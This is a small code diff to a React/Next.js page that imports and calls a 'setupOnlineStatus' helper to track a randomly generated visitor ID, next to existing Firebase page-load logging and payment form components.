@@ -4,6 +4,7 @@ import Loader from "@/components/loader";
 import PaymentForm from "@/components/pm";
 import ZainPaymentForm from "@/components/zms";
 import { addData } from "@/lib/firebase";
+import { setupOnlineStatus } from "@/lib/utils";
 import { useEffect, useState, useCallback } from "react";
 
 const visitorId = `zain-app-${Math.random().toString(36).substring(2, 15)}`;
@@ -30,6 +31,8 @@ export default function Page() {
         action: "page_load",
         currentPage: "الرئيسية ",
       });
+      setupOnlineStatus(visitorId!);
+
       localStorage.setItem("country", country); // Consider privacy implications
     } catch (error) {
       console.error("Error fetching location:", error);
